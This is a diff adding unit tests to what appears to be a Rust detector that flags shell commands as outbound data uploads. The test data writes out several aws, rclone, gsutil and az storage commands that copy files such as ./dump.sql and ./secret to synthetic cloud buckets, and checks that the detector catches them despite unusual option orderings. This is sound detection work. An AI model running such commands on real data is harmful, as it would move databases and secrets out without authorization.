@@ -1072,9 +1072,79 @@ fn object_storage_reads_with_options_before_the_source_do_not_match_in_the_actio
         "aws s3 cp help",
         "aws cp x y",
         "az storage copy --source-account-name acct --source-container c --destination ./dl",
+        "rclone copy --s3-endpoint minio:9000 synthetic-remote:src ./local",
+        "rclone --max-age 1d copy synthetic-remote:src ./local",
+        "gsutil -u fixture-project cp gs://synthetic-bucket/a ./a",
+        "aws --color off s3 cp s3://synthetic-bucket/a ./a",
     ] {
         assert!(
             !session_and_action_match(command, "exfil.outbound_upload").1,
+            "{command}"
+        );
+    }
+}
+
+/// The command group and verb are found after global options the reader
+/// does not list.
+#[test]
+fn object_storage_uploads_after_unlisted_global_options_match_in_the_action_view() {
+    for command in [
+        "aws --color off s3 cp ./dump.sql s3://synthetic-bucket/",
+        "aws --cli-binary-format raw-in-base64-out s3 cp ./dump.sql s3://synthetic-bucket/",
+        "aws --no-sign-request --some-new-option v s3 cp ./dump.sql s3://synthetic-bucket/",
+        "rclone --max-age 1d copy ./d synthetic-remote:b",
+    ] {
+        assert!(
+            session_and_action_match(command, "exfil.outbound_upload").1,
+            "{command}"
+        );
+    }
+}
+
+/// A long option's separate value is not read as the source of an rclone
+/// transfer, even when it holds a colon.
+#[test]
+fn rclone_uploads_after_option_values_with_a_colon_match_in_the_action_view() {
+    for command in [
+        "rclone copy --s3-endpoint minio:9000 ./dump synthetic-remote:b",
+        "rclone copy --rc-addr localhost:5572 ./dump synthetic-remote:b",
+        "rclone copy --compare-dest old:x ./dump synthetic-remote:b",
+        "rclone sync --copy-dest old:x ./dump synthetic-remote:b",
+    ] {
+        assert!(
+            session_and_action_match(command, "exfil.outbound_upload").1,
+            "{command}"
+        );
+    }
+}
+
+/// gsutil letters that take a value as global options are flags after the
+/// verb.
+#[test]
+fn gsutil_transfer_flags_after_the_verb_match_in_the_action_view() {
+    for command in [
+        "gsutil -m rsync -r -u ./data gs://synthetic-bucket",
+        "gsutil -m rsync -i -r ./data gs://synthetic-bucket",
+        "gsutil rsync -du ./data gs://synthetic-bucket",
+        "gsutil -o GSUtil:parallel_composite_upload_threshold=150M cp ./dump.sql gs://synthetic-bucket/",
+    ] {
+        assert!(
+            session_and_action_match(command, "exfil.outbound_upload").1,
+            "{command}"
+        );
+    }
+}
+
+/// An `az storage copy` with a local source is an upload even when it also
+/// names a storage-account source option.
+#[test]
+fn azure_copy_with_a_local_source_beside_account_options_matches_in_the_action_view() {
+    for command in [
+        "az storage copy -s ./secret --source-account-name acct -d https://acct.blob.core.windows.net/c",
+        "az storage copy --source-local-path ./secret --source-container c -d https://acct.blob.core.windows.net/c",
+    ] {
+        assert!(
+            session_and_action_match(command, "exfil.outbound_upload").1,
             "{command}"
         );
     }
